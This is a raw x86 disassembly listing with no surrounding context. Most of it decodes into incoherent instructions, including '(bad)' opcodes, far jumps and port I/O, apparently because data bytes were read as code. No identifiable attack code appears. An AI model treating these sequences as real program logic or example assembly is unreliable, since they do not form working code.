  4158f9:	xchg   esi,eax
  4158fa:	(bad)
  4158fd:	into   
  4158fe:	mov    eax,ds:0xa1e9e2c7
  415903:	test   al,0xbd
  415905:	daa    
  415906:	xchg   esi,eax
  415907:	(bad)
  41590a:	into   
  41590b:	mov    eax,ds:0xa1e9e2c7
  415910:	test   al,0xbd
  415912:	daa    
  415913:	xchg   esi,eax
  415914:	(bad)
  415917:	into   
  415918:	mov    eax,ds:0xa1e9e2c7
  41591d:	test   al,0xbd
  41591f:	daa    
  415920:	xchg   esi,eax
  415921:	(bad)
  415924:	into   
  415925:	mov    eax,ds:0xa1e9e2c7
  41592a:	test   al,0xbd
  41592c:	daa    
  41592d:	xchg   esi,eax
  41592e:	(bad)
  415931:	into   
  415932:	mov    eax,ds:0xa1e9e2c7
  415937:	test   al,0xbd
  415939:	daa    
  41593a:	xchg   esi,eax
  41593b:	(bad)
  41593e:	into   
  41593f:	mov    eax,ds:0xa1e9e2c7
  415944:	test   al,0xbd
  415946:	daa    
  415947:	xchg   esi,eax
  415948:	(bad)
  41594b:	into   
  41594c:	mov    eax,ds:0xa1e9e2c7
  415951:	test   al,0xbd
  415953:	daa    
  415954:	xchg   esi,eax
  415955:	(bad)
  415958:	gs out dx,eax
  41595a:	int3   
  41595b:	loop   0x415923
  41595d:	mov    eax,ds:0x9627ada8
  415962:	out    dx,eax
  415963:	popa   
  415964:	push   ebx
  415965:	mov    edx,0xfbd1881c
  41596a:	mov    dl,BYTE PTR [ebx+0x5723c880]
  415970:	(bad)
  415973:	push   eax
  415974:	sbb    edx,DWORD PTR [ecx-0x6]
  415977:	out    0x93,al
  415979:	push   esp
  41597a:	call   FWORD PTR ds:0x344bb287
  415980:	out    dx,al
  415981:	push   eax
  415982:	mov    esp,0xdee87536
  415987:	dec    edx
  415988:	jne    0x415a08
  41598a:	adc    ch,BYTE PTR [ebp+ecx*4-0x19db058]
  415991:	pop    esp
  415992:	mov    BYTE PTR [edi+ebx*1-0x3170382b],al
  415999:	push   ss
  41599a:	cmp    eax,0x12d7ad10
  41599f:	pop    esi
  4159a0:	dec    ecx
  4159a1:	or     DWORD PTR ds:[ebx+0x3da1db32],0x5176f220
  4159ac:	add    al,BYTE PTR [edi+0x3f8e138a]
  4159b2:	and    esp,DWORD PTR [ecx]
  4159b4:	inc    edi
  4159b5:	out    0x75,al
  4159b7:	xor    eax,0x759a3340
  4159bc:	mov    ds:0xe87c83c1,eax
  4159c1:	lds    edi,FWORD PTR [edx+0xd]
  4159c4:	xchg   esp,eax
  4159c5:	cdq    
  4159c6:	std    
  4159c7:	or     dl,bl
  4159c9:	jmp    0x65c4:0xdb91db94
  4159d0:	push   0x593a82cd
  4159d5:	mov    esp,0x6adabef4
  4159da:	pop    ecx
  4159db:	test   DWORD PTR [edx+0x35534272],edx
  4159e1:	iret   
  4159e2:	inc    ecx
  4159e3:	mov    al,0x93
  4159e5:	pop    ebp
  4159e6:	or     eax,0x1b4ee65b
  4159eb:	fstp   QWORD PTR [esi-0x45aed878]
  4159f1:	(bad)  
  4159f2:	xor    BYTE PTR [esi-0x5],bl
  4159f5:	(bad)  
  4159f6:	frstor [ebx+ecx*8-0x11880fa6]
  4159fd:	pop    ecx
  4159fe:	imul   eax,DWORD PTR ss:[edi+0x22],0x9dbef374
  415a06:	pusha  
  415a07:	mov    ch,0x80
  415a09:	jecxz  0x4159c8
  415a0b:	ins    BYTE PTR es:[edi],dx
  415a0c:	stos   DWORD PTR es:[edi],eax
  415a0d:	cmp    eax,0x274f2c26
  415a12:	ds add ah,0x8d
  415a16:	cmp    BYTE PTR [esi],0x9c
  415a19:	pusha  
  415a1a:	outs   dx,BYTE PTR ds:[esi]
  415a1b:	pop    ebp
  415a1c:	dec    esp
  415a1d:	ja     0x4159dc
  415a1f:	cli    
  415a20:	sub    al,BYTE PTR [ebx-0x4db070a0]
  415a26:	or     bl,cl
  415a28:	je     0x415a5a
  415a2a:	(bad)  
  415a2b:	sub    cl,BYTE PTR [edx+0x4cb02c01]
  415a31:	fs shl cl,0xe6
  415a35:	cmp    bh,BYTE PTR [ebx]
  415a37:	sub    al,0xd5
  415a39:	mov    bh,BYTE PTR [eax-0x17]
  415a3c:	push   esp
  415a3d:	scas   eax,DWORD PTR es:[edi]
  415a3e:	jle    0x415a49
  415a40:	outs   dx,DWORD PTR ds:[esi]
  415a41:	xchg   esi,eax
  415a42:	dec    esi
  415a43:	das    
  415a44:	pop    edi
  415a45:	add    al,0xc1
  415a47:	daa    
  415a48:	je     0x4159ca
  415a4a:	popa   
  415a4b:	out    0xb,eax
  415a4d:	jns    0x415a7d
  415a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a50:	or     eax,0x7ec4040d
  415a55:	cwde   
  415a56:	imul   eax,DWORD PTR [edx],0x132d6952
  415a5c:	xor    BYTE PTR [esi-0xe],cl
  415a5f:	dec    ebp
  415a60:	cli    
  415a61:	mov    al,ds:0x33e7bf42
  415a66:	jnp    0x415a69
  415a68:	ins    BYTE PTR es:[edi],dx
  415a69:	outs   dx,BYTE PTR ds:[esi]
  415a6a:	mov    eax,ds:0xb225c80d
  415a6f:	xchg   esi,eax
  415a70:	retf   0x4c6e
  415a73:	outs   dx,BYTE PTR ds:[esi]
  415a74:	mov    ?,WORD PTR [esi+0x31791ea3]
  415a7a:	aaa    
  415a7b:	xor    al,0x7d
  415a7d:	frstor [esi]
  415a7f:	outs   dx,DWORD PTR ds:[esi]
  415a80:	dec    esp
  415a81:	add    cl,BYTE PTR [ecx+0x7e]
  415a84:	enter  0xae62,0x8d
  415a88:	jnp    0x415a79
  415a8a:	pusha  
  415a8b:	das    
  415a8c:	shl    BYTE PTR [ebx],0xa1
  415a8f:	(bad)  
  415a90:	mov    ebp,0xaa6577d
  415a95:	push   ebx
  415a96:	pop    ecx
  415a97:	push   ecx
  415a98:	jae    0x415a7a
  415a9a:	or     BYTE PTR [edi+0x38],bh
  415a9d:	push   ds
  415a9e:	(bad)  
  415a9f:	xlat   BYTE PTR ds:[ebx]
  415aa0:	hlt    
  415aa1:	fs jb  0x415ab4
  415aa4:	pop    ebp
  415aa5:	adc    ecx,DWORD PTR [ebx]
  415aa7:	mov    es,WORD PTR [edi-0x4ff0dab5]
  415aad:	xchg   edi,eax
  415aae:	or     eax,DWORD PTR [edx-0x10]
  415ab1:	jnp    0x415aac
  415ab3:	into   
  415ab4:	jmp    0x3a6a:0xd4f0074e
  415abb:	jno    0x415af8
  415abd:	cld    
  415abe:	stc    
  415abf:	sar    DWORD PTR [edx-0x4f],0x4c
  415ac3:	pop    es
  415ac4:	jmp    0x39bae992
  415ac9:	sub    ah,bh
  415acb:	inc    ebp
  415acc:	xchg   ecx,eax
  415acd:	out    dx,al
  415ace:	clc    
  415acf:	cld    
  415ad0:	rcr    DWORD PTR [esi],cl
  415ad2:	add    DWORD PTR [eax-0x2a0cf8f6],esp
  415ad8:	mov    ebx,0x21b1c7c9
  415add:	pop    ecx
  415ade:	push   ebp
  415adf:	jl     0x415ab4
  415ae1:	jg     0x415ae7
  415ae3:	push   ebx
  415ae4:	push   es
  415ae5:	repnz (bad) 
  415ae8:	or     BYTE PTR [eax],dh
  415aea:	fsin   
  415aec:	js     0x415b11
  415aee:	sub    esi,eax
  415af0:	dec    ebp
  415af1:	xor    DWORD PTR [edx-0x3f],eax
  415af4:	in     eax,dx
  415af5:	adc    DWORD PTR [ebx-0x76],edi
  415af8:	mov    WORD PTR [ebx-0x47],gs
  415afb:	xor    esp,DWORD PTR [eax-0x4a85d39e]
  415b01:	pop    ebx
  415b02:	inc    edx
  415b03:	inc    edi
  415b04:	nop
  415b05:	xchg   edx,eax
  415b06:	lds    ebp,FWORD PTR [ebp-0x7a]
  415b09:	sbb    BYTE PTR [ecx],cl
  415b0b:	sbb    bh,BYTE PTR [esi+0x59]
  415b0e:	adc    eax,0x930b293b
  415b13:	pop    edi
  415b14:	popa   
  415b15:	loopne 0x415b64
  415b17:	stc    
  415b18:	fstp   QWORD PTR [ebp-0x6bd0bcd9]
  415b1e:	out    dx,al
  415b1f:	aad    0xbf
  415b21:	mov    cl,0x56
  415b23:	mov    dh,0xdb
  415b25:	cmc    
  415b26:	adc    ecx,edi
  415b28:	mov    edi,0xf7881479
  415b2d:	ja     0x415b58
  415b2f:	mov    ds:0x69bccef2,al
  415b34:	fnstcw WORD PTR [edx-0x3f41c26d]
  415b3a:	test   eax,0x85917859
  415b3f:	sub    BYTE PTR [edi+0x47135839],bh
  415b45:	pushf  
  415b46:	sbb    edi,edx
  415b48:	ins    DWORD PTR es:[edi],dx
  415b49:	aad    0xfb
  415b4b:	outs   dx,BYTE PTR ds:[esi]
  415b4c:	scas   eax,DWORD PTR es:[edi]
  415b4d:	(bad)  
  415b4e:	int    0x96
  415b50:	add    bh,ch
  415b52:	aam    0x6d
  415b54:	mov    edi,0xdd7eb1e0
  415b59:	js     0x415ae2
  415b5b:	pop    eax
  415b5c:	push   ebx
  415b5d:	aaa    
  415b5e:	and    BYTE PTR [edx],bh
  415b60:	pop    ebx
  415b61:	fs out 0xb1,al
  415b64:	sbb    DWORD PTR [ebx+0x23],edi
  415b67:	push   eax
  415b68:	(bad)  
  415b69:	idiv   BYTE PTR [edx]
  415b6b:	adc    eax,0x941dcb56
  415b70:	pop    edx
  415b71:	xchg   esp,eax
  415b72:	sub    cl,dl
  415b74:	xchg   DWORD PTR [ebx],edx
  415b76:	lahf   
  415b77:	jg     0x415bcf
  415b79:	cmp    al,0x1d
  415b7b:	sub    eax,edx
  415b7d:	cmp    edi,DWORD PTR [esi]
  415b7f:	int3   
  415b80:	mov    bl,0xe6
  415b82:	int    0x99
  415b84:	and    DWORD PTR [eax+0x277deb36],eax
  415b8a:	jae    0x415bb6
  415b8c:	imul   ebp,eax,0xb656f4fc
  415b92:	lahf   
  415b93:	cmp    bl,ch
  415b95:	or     BYTE PTR [ebp+0x48],bh
  415b98:	adc    eax,0xf92b895a
  415b9d:	xchg   esi,eax
  415b9e:	mov    dl,0x40
  415ba0:	lods   eax,DWORD PTR ds:[esi]
  415ba1:	(bad)  
  415ba2:	dec    eax
  415ba3:	or     cl,0x4f
  415ba6:	adc    dh,BYTE PTR [eax]
  415ba8:	push   es
  415ba9:	mov    edx,0xe60e52b1
  415bae:	jbe    0x415c02
  415bb0:	mov    ah,0x7
  415bb2:	add    bh,ah
  415bb4:	fsubr  st,st(7)
  415bb6:	shl    edx,1
  415bb8:	sbb    al,0xb7
  415bba:	mov    ebx,0xaca78c0d
  415bbf:	les    esi,FWORD PTR [edx]
  415bc1:	push   ebp
  415bc2:	inc    ecx
  415bc3:	sahf   
  415bc4:	sub    dl,al
  415bc6:	ja     0x415c12
  415bc8:	push   eax
  415bc9:	js     0x415b7c
  415bcb:	push   esi
  415bcc:	mov    ds:0x6bcf98cb,eax
  415bd1:	fidiv  WORD PTR [esi+esi*2+0xc]
  415bd5:	lods   eax,DWORD PTR ds:[esi]
  415bd6:	pusha  
  415bd7:	jmp    0x415bf9
  415bd9:	js     0x415ba5
  415bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bdc:	fadd   DWORD PTR [esi-0x5a607e0d]
  415be2:	mov    ss,esi
  415be4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415be5:	fldcw  WORD PTR [esi-0x7f]
  415be8:	jbe    0x415bef
  415bea:	in     eax,0x38
  415bec:	frstor [ebx-0x1b]
  415bef:	sbb    cl,BYTE PTR [edi-0x44]
  415bf2:	and    dh,al
  415bf4:	aam    0x7c
  415bf6:	dec    ebx
  415bf7:	das    
  415bf8:	int3   
  415bf9:	xor    al,cl
  415bfb:	mov    edx,0x28d44f3e
  415c00:	inc    esp
  415c01:	stos   BYTE PTR es:[edi],al
  415c02:	test   eax,0xcfae8ddd
  415c07:	in     al,0x6e
  415c09:	retf   0x4cb0
  415c0c:	inc    ecx
  415c0d:	mov    bl,0xf7
  415c0f:	pop    ss
  415c10:	sti    
  415c11:	mov    bh,0xb0
  415c13:	jo     0x415c1f
  415c15:	adc    DWORD PTR [esi],esi
  415c17:	dec    ecx
  415c18:	stos   BYTE PTR es:[edi],al
  415c19:	jg     0x415bd0
  415c1b:	xchg   ebx,ebp
  415c1d:	ret    0xfcf5
  415c20:	pop    ss
  415c21:	aam    0x24
  415c23:	or     al,0xd8
  415c25:	aaa    
  415c26:	xor    al,BYTE PTR [edx-0x72]
  415c29:	mov    ds:0x43f9d3cc,al
  415c2e:	repz xchg edx,eax
  415c30:	mov    ecx,0xd18f2ee9
  415c35:	push   ecx
  415c36:	push   eax
  415c37:	dec    ebx
  415c38:	into   
  415c39:	ret    0xab29
  415c3c:	jbe    0x415bec
  415c3e:	inc    eax
  415c3f:	outs   dx,BYTE PTR ds:[esi]
  415c40:	retf   0x1e08
  415c43:	pusha  
  415c44:	add    esi,esi
  415c46:	jmp    0x415c7a
  415c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c49:	xlat   BYTE PTR ds:[ebx]
  415c4a:	test   eax,0xe61355de
  415c4f:	and    al,0xe5
  415c51:	add    BYTE PTR [ecx+eiz*1+0x77700ae8],dh
  415c58:	adc    al,0x10
  415c5a:	retf   0x1668
  415c5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c5e:	call   0x8fa6:0x204cdad9
  415c65:	mov    al,ds:0x66a40bbf
  415c6a:	stos   BYTE PTR es:[edi],al
  415c6b:	sub    DWORD PTR [esi],ecx
  415c6d:	aam    0x18
  415c6f:	out    dx,eax
  415c70:	add    ah,ch
  415c72:	leave  
  415c73:	or     BYTE PTR [edx-0x30],dh
  415c76:	or     al,0x46
  415c78:	jmp    0x34355bc9
  415c7d:	nop
  415c7e:	xchg   esi,eax
  415c7f:	jmp    0x415c36
  415c81:	lea    ecx,[esi+ebp*4-0x2d]
  415c85:	arpl   si,bx
  415c87:	jg     0x415cc0
  415c89:	int    0x82
  415c8b:	dec    edx
  415c8c:	call   0x9bc0:0x719c69fa
  415c93:	jo     0x415c7b
  415c95:	adc    dl,BYTE PTR [ebx+0x7616e2b1]
  415c9b:	lods   al,BYTE PTR ds:[esi]
  415c9c:	and    bh,BYTE PTR [edi+0x32]
  415c9f:	or     eax,0x56a36c69
  415ca4:	xchg   esi,eax
  415ca5:	retf   
  415ca6:	(bad)  
  415ca7:	enter  0x287d,0x3a
  415cab:	push   edx
  415cac:	pop    edx
  415cad:	loopne 0x415c4b
  415caf:	pop    ebp
  415cb0:	xchg   BYTE PTR [edx],bh
  415cb2:	push   eax
  415cb3:	dec    edx
  415cb4:	stos   DWORD PTR es:[edi],eax
  415cb5:	(bad)  
  415cb7:	push   edi
  415cb8:	inc    DWORD PTR [edx+0x144ced53]
  415cbe:	aaa    
  415cbf:	jnp    0x415d2c
  415cc1:	adc    al,dl
  415cc3:	mov    al,BYTE PTR [ecx+0x3c]
  415cc6:	sub    esp,DWORD PTR [ebx]
  415cc8:	hlt    
  415cc9:	mov    al,0x9
  415ccb:	les    ebp,FWORD PTR [esi]
  415ccd:	add    ebx,DWORD PTR [esp-0x2f]
  415cd1:	aas    
  415cd2:	push   ds
  415cd3:	mov    bh,BYTE PTR [ebx]
  415cd5:	fnstenv [edx]
  415cd7:	(bad)  
  415cd8:	int3   
  415cd9:	call   0x5d72:0x30b084fc
  415ce0:	sbb    DWORD PTR [esp+ecx*4],ecx
  415ce3:	jne    0x415d3b
  415ce5:	mov    ebp,0x19e54944
  415cea:	dec    edi
  415ceb:	scas   eax,DWORD PTR es:[edi]
  415cec:	jg     0x415d59
  415cee:	outs   dx,DWORD PTR ds:[esi]
  415cef:	xchg   BYTE PTR [eax+0x2f],dh
  415cf2:	dec    esi
  415cf3:	mov    edx,0x14776df5
  415cf8:	jge    0x415d45
  415cfa:	adc    al,0x38
  415cfc:	mov    esi,0xdc77d2b6
  415d01:	xor    bh,BYTE PTR [edi+0xe3eacee]
  415d07:	pop    edi
  415d08:	add    ebp,0xffffffd8
  415d0b:	add    BYTE PTR [edi-0x64],ah
  415d0e:	lock xchg ebp,eax
  415d10:	xchg   esi,eax
  415d11:	xor    al,0x22
  415d13:	(bad)
  415d17:	fiadd  WORD PTR [edi+0x53]
  415d1a:	add    al,0x48
  415d1c:	xor    al,0x97
  415d1e:	pop    esp
  415d1f:	pop    esp
  415d20:	push   ebp
  415d21:	push   eax
  415d22:	call   0x756d:0x41b05785
  415d29:	dec    ecx
  415d2a:	xchg   esi,eax
  415d2b:	jg     0x415d77
  415d2d:	mov    ah,BYTE PTR [ebx+0x379e2c4f]
  415d33:	inc    eax
  415d34:	popf   
  415d35:	outs   dx,DWORD PTR ds:[esi]
  415d36:	push   0x170fa88d
  415d3b:	sbb    ch,BYTE PTR [ecx+ebp*2]
  415d3e:	push   0x10
  415d40:	lods   eax,DWORD PTR ds:[esi]
  415d41:	inc    esi
  415d42:	sbb    al,BYTE PTR [esi+ecx*1-0x40]
  415d46:	add    eax,0x750de060
  415d4b:	sub    al,0x82
  415d4d:	jo     0x415d6a
  415d4f:	pop    eax
  415d50:	mov    ebp,0x4486ee2c
  415d55:	lock xlat BYTE PTR ds:[ebx]
  415d57:	push   edi
  415d58:	and    DWORD PTR [ebx-0x32b63b5c],edx
  415d5e:	or     BYTE PTR [esi],dh
  415d60:	add    al,0xed
  415d62:	cld    
  415d63:	scas   al,BYTE PTR es:[edi]
  415d64:	cdq    
  415d65:	xlat   BYTE PTR ds:[ebx]
  415d66:	sub    DWORD PTR ds:[ecx],ebx
  415d69:	mov    ch,0xdc
  415d6b:	sub    ebx,ecx
  415d6d:	mov    ebx,0xcafec351
  415d72:	jb     0x415d82
  415d74:	std    
  415d75:	sar    BYTE PTR [edi-0x9],0xbc
  415d79:	scas   al,BYTE PTR es:[edi]
  415d7a:	bound  eax,QWORD PTR [eax-0x51f71110]
  415d80:	push   cs
  415d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d82:	push   ebx
  415d83:	not    BYTE PTR [ebp-0x5f]
  415d86:	out    0x1c,al
  415d88:	cld    
  415d89:	ds retf 
  415d8b:	xor    ecx,DWORD PTR [esi-0x4dc4d4bc]
  415d91:	mov    edx,0x95e11e78
  415d96:	call   0xb31f:0xd492b4d1
  415d9d:	and    ah,0xde
  415da0:	ss and ebp,ebx
  415da3:	retf   0x50ea
  415da6:	xchg   edx,eax
  415da7:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  415da9:	xchg   ecx,eax
  415daa:	xchg   DWORD PTR ds:0x11f9e10c,esp
  415db0:	or     esi,eax
  415db2:	sbb    ebp,edi
  415db4:	and    bh,BYTE PTR [ebp-0x60]
  415db7:	mov    ah,0xfe
  415db9:	das    
  415dba:	push   eax
  415dbb:	daa    
  415dbc:	imul   ebx,DWORD PTR [eax-0x3b],0x57
  415dc0:	push   ds
  415dc1:	mov    al,ds:0x84f94c1d
  415dc6:	frstor [edx+0x3c4a2aa2]
  415dcc:	retf   
  415dcd:	ffree  st(3)
  415dcf:	jnp    0x415dab
  415dd1:	popa   
  415dd2:	add    cl,bl
  415dd4:	xchg   esp,eax
  415dd5:	adc    eax,0x7eec87a1
  415dda:	xchg   ebp,eax
  415ddb:	stos   DWORD PTR es:[edi],eax
  415ddc:	and    DWORD PTR [esi],esp
  415dde:	inc    edx
  415ddf:	pop    eax
  415de0:	and    ch,BYTE PTR [ecx+0x7b]
  415de3:	out    0xc7,eax
  415de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de6:	mov    ah,0x4c
  415de8:	(bad)  
  415dea:	sub    eax,0xfd52015a
  415def:	lds    esi,FWORD PTR [edx+0x533eac85]
  415df5:	(bad)  
  415df6:	and    al,0x5a
  415df8:	(bad)  
  415df9:	sbb    al,0x9a
  415dfb:	jo     0x415d80
  415dfd:	ja     0x415e62
  415dff:	mov    bh,0x5c
  415e01:	pop    esi
  415e02:	iret   
  415e03:	push   eax
  415e04:	jl     0x415e49
  415e06:	daa    
  415e07:	nop
  415e08:	cwde   
  415e09:	inc    ebx
  415e0a:	outs   dx,DWORD PTR ds:[esi]
  415e0b:	das    
  415e0c:	push   edx
  415e0d:	fs dec esi
  415e0f:	das    
  415e10:	pop    ds
  415e11:	xor    DWORD PTR ds:0x2b2b06c4,ebp
  415e17:	and    al,0x6b
  415e19:	(bad)  
  415e1b:	sub    DWORD PTR [edi+0x5ceb10d6],esp
  415e21:	cmc    
  415e22:	push   eax
  415e23:	shl    DWORD PTR [ebx+ebp*8],0x4d
  415e27:	addr16 jb 0x415e93
  415e2a:	xchg   esi,edx
  415e2c:	jl     0x415e2b
  415e2e:	mov    cl,0x3a
  415e30:	imul   esi,DWORD PTR [esi],0xda5fc9fc
  415e36:	pop    ecx
  415e37:	cmp    esi,DWORD PTR ds:0x72a49a21
  415e3d:	jb     0x415df8
  415e3f:	sbb    esp,edx
  415e41:	push   eax
  415e42:	daa    
  415e43:	mov    DWORD PTR [edx],eax
  415e45:	xchg   esi,eax
  415e46:	sar    DWORD PTR [ebx],0xd
  415e49:	mov    cl,0xbc
  415e4b:	repz or ax,0xdd0b
  415e50:	ficomp WORD PTR [esi-0x50]
  415e53:	fmul   QWORD PTR [edx]
  415e55:	loop   0x415e9f
  415e57:	and    al,0xd0
  415e59:	pop    edi
  415e5a:	xchg   ebx,esi
  415e5c:	rol    DWORD PTR [ecx+0x42924163],0x93
  415e63:	sub    al,BYTE PTR [eax-0x6b]
  415e66:	sbb    al,0x7b
  415e68:	pushf  
  415e69:	ja     0x415e09
  415e6b:	xchg   edi,eax
  415e6c:	push   eax
  415e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e6e:	dec    ebp
  415e6f:	repnz inc ebx
  415e71:	mov    ebx,0x9b2cb863
  415e76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e77:	sub    al,0x94
  415e79:	push   eax
  415e7a:	adc    eax,0x5bbd218
  415e7f:	dec    ecx
  415e80:	push   ds
  415e81:	aaa    
  415e82:	xchg   ebx,eax
  415e83:	add    bl,BYTE PTR [ebx-0x40]
  415e86:	aad    0xeb
  415e88:	dec    edi
  415e89:	xchg   edi,eax
  415e8a:	sbb    al,0xa1
  415e8c:	loope  0x415e7d
  415e8e:	cld    
  415e8f:	sbb    BYTE PTR [ecx+esi*1+0x41],dh
  415e93:	test   ebx,ebp
  415e95:	mov    eax,ds:0x740188c
  415e9a:	mov    eax,0x7699593
  415e9f:	mov    cl,0x9f
  415ea1:	mov    ds:0xb7217efa,al
  415ea6:	in     eax,0x45
  415ea8:	loope  0x415f21
  415eaa:	mov    ecx,0x21b1d957
  415eaf:	out    dx,al
  415eb0:	cwde   
  415eb1:	xchg   ebx,eax
  415eb2:	ins    BYTE PTR es:[edi],dx
  415eb3:	cmp    ah,ah
  415eb5:	mov    DWORD PTR [esi*4+0x53d008f3],esp
  415ebc:	xchg   ebp,edi
  415ebe:	loope  0x415e9b
  415ec0:	add    BYTE PTR [edx],0x41
  415ec3:	loope  0x415f20
  415ec5:	pop    esi
  415ec6:	addr16 xor al,0x2
  415ec9:	outs   dx,BYTE PTR ds:[esi]
  415eca:	popa   
  415ecb:	add    eax,0x44cdd681
  415ed0:	xor    ecx,DWORD PTR [eax+eiz*4-0x2b05be94]
  415ed7:	mov    edx,0xbc1989
  415edc:	aaa    
  415edd:	mov    eax,ebx
  415edf:	mov    ds,WORD PTR [eax+eax*1-0x2ab1b429]
  415ee6:	pusha  
  415ee7:	lods   eax,DWORD PTR ds:[esi]
  415ee8:	enter  0x5576,0xc7
  415eec:	mov    ebx,?
  415eee:	popa   
  415eef:	hlt    
  415ef0:	cmp    DWORD PTR [edi],ebp
  415ef2:	pop    ebx
  415ef3:	fidivr WORD PTR [ebp-0x3d]
  415ef6:	ds pop eax
  415ef8:	xchg   edi,eax
  415ef9:	rep lods eax,DWORD PTR ds:[esi]
  415efb:	or     bl,BYTE PTR [ebx]
  415efd:	dec    ebx
  415efe:	dec    ebx
  415eff:	adc    edi,DWORD PTR [ecx+esi*2-0x11021ed5]
  415f06:	xchg   esp,ebx
  415f08:	call   0x9204:0x389fef8
  415f0f:	pop    ecx
  415f10:	xor    ebp,edi
  415f12:	mov    edi,DWORD PTR [esi]
  415f14:	ror    DWORD PTR [esi],cl
  415f16:	loopne 0x415f2e
  415f18:	aad    0xec
  415f1a:	out    0xc5,al
  415f1c:	push   ebx
  415f1d:	mov    dh,0x34
  415f1f:	shl    BYTE PTR [ebx],0xcf
  415f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f23:	mov    edx,0xa35eb71d
  415f28:	mov    edi,0x51a1aa45
  415f2d:	inc    edx
  415f2e:	jmp    0x415ecc
  415f30:	bound  ebp,QWORD PTR [ebp+ebp*1+0x4268550e]
  415f37:	jb     0x415f7b
  415f39:	and    ebp,DWORD PTR [ebx+0x6581bf7c]
  415f3f:	enter  0xeb2c,0x18
  415f43:	fstp   QWORD PTR [edi]
  415f45:	xlat   BYTE PTR ds:[ebx]
  415f46:	xchg   DWORD PTR ds:0x8937d608,edx
  415f4c:	xchg   edi,eax
  415f4d:	jle    0x415fba
  415f4f:	jmp    0x1b25:0xea153677
  415f56:	mov    ecx,ecx
  415f58:	mov    cl,0x2f
  415f5a:	push   0xc70dd76e
  415f5f:	dec    eax
  415f60:	loop   0x415f9a
  415f62:	dec    edx
  415f63:	push   ebp
  415f64:	pop    eax
  415f65:	shr    BYTE PTR fs:[edx+0x9],1
  415f69:	dec    esi
  415f6a:	pop    edi
  415f6b:	cs push es
  415f6d:	shl    cl,0x63
  415f70:	repz test bh,dh
  415f73:	mov    dh,0x99
  415f75:	repz push esi
  415f77:	int3   
  415f78:	leave  
  415f79:	cmp    al,0x3a
  415f7b:	dec    eax
  415f7c:	in     eax,dx
  415f7d:	and    DWORD PTR [eax],esp
  415f7f:	ret    0x934d
  415f82:	pop    edx
  415f83:	add    DWORD PTR [ebp+edi*4+0x1b4c13d2],ebx
  415f8a:	mov    edx,0x5a8ec4f3
  415f8f:	stos   DWORD PTR es:[edi],eax
  415f90:	mov    ecx,0x31df9419
  415f95:	retf   0x9c38
  415f98:	in     eax,dx
  415f99:	std    
  415f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f9b:	xor    edi,DWORD PTR [edx+ebp*2]
  415f9e:	lahf   
  415f9f:	xchg   ebx,eax
  415fa0:	xor    al,0xce
  415fa2:	mov    al,ds:0x1b08bebf
  415fa7:	xchg   sp,ax
  415fa9:	inc    DWORD PTR [ebx+0xe]
  415fac:	or     cl,BYTE PTR [eax-0x7f]
  415faf:	inc    edi
  415fb0:	mov    dl,0x64
  415fb2:	in     al,dx
  415fb3:	pop    ebx
  415fb4:	pop    ss
  415fb5:	ds inc ecx
  415fb7:	mov    esp,0x2ccbf52d
  415fbc:	rcr    BYTE PTR [ebx+0x27],cl
  415fbf:	loop   0x415f91
  415fc1:	jnp    0x415fb6
  415fc3:	cmp    DWORD PTR [eax],eax
  415fc5:	or     eax,0x9b8fc6d6
  415fca:	aam    0xed
  415fcc:	pop    esi
  415fcd:	inc    ecx
  415fce:	out    dx,al
  415fcf:	jl     0x415fe6
  415fd1:	or     ch,al
  415fd3:	loopne 0x416005
  415fd5:	mov    ah,BYTE PTR [edi+0x7cceeb1f]
  415fdb:	pusha  
  415fdc:	lods   eax,DWORD PTR ds:[esi]
  415fdd:	popf   
  415fde:	stos   BYTE PTR es:[edi],al
  415fdf:	enter  0x5fd9,0xa6
  415fe3:	add    bl,BYTE PTR [edi]
  415fe5:	push   ebp
  415fe6:	fld    QWORD PTR [eax-0x75]
  415fe9:	cmp    BYTE PTR [esi+ebx*8-0x62080391],dh
  415ff0:	sbb    BYTE PTR [esi+0x7b],0xf4
  415ff4:	ret    
  415ff5:	mov    dh,0xcb
  415ff7:	push   es
  415ff8:	lea    esi,[edi-0x3c22b2bb]
  415ffe:	ja     0x416054
  416000:	cmp    al,BYTE PTR [ecx]
  416002:	mov    dl,0x7a
  416004:	and    ebx,edi
  416006:	push   0xffffffbb
  416008:	and    dl,ch
  41600a:	or     ebp,ebx
  41600c:	ror    BYTE PTR [edx],0x8e
  41600f:	mov    ebx,0xe0f99a2f
  416014:	dec    edi
  416015:	mov    eax,0x67ac544f
  41601a:	mov    esi,0xce8df38
  41601f:	push   ecx
  416020:	test   DWORD PTR [ebp+0x1c],esi
  416023:	cmp    bl,BYTE PTR [eax+eax*1+0x6c]
  416027:	push   cs
  416028:	hlt    
  416029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41602a:	mov    esp,0xe89e9ed7
  41602f:	(bad)  
  416030:	fdivp  st(3),st
  416032:	aad    0x44
  416034:	mov    ds:0xa30e0b80,al
  416039:	int    0x5d
  41603b:	inc    ebx
  41603c:	adc    eax,0x2884f806
  416041:	call   0x6ae15b7e
  416046:	xor    al,0xeb
  416048:	push   ebp
  416049:	aad    0x2c
  41604b:	sub    DWORD PTR [edx],esi
  41604d:	mov    al,0xb0
  41604f:	adc    DWORD PTR [esi],ecx
  416051:	or     bl,dl
  416053:	icebp  
  416054:	jb     0x415ff9
  416056:	mov    DWORD PTR fs:[edi+ebp*4+0x1713fd4c],edi
  41605e:	pop    es
  41605f:	ror    esi,1
  416061:	xchg   DWORD PTR [ebp+0x46],ecx
  416064:	sbb    ah,0x70
  416067:	push   ss
  416068:	jnp    0x416017
  41606a:	pop    edx
  41606b:	adc    BYTE PTR [ebx-0x1e],0xcb
  41606f:	lea    esi,[bp+di]
  416072:	adc    cl,BYTE PTR [esi-0x49bd8e5c]
  416078:	xlat   BYTE PTR ds:[ebx]
  416079:	jecxz  0x41609f
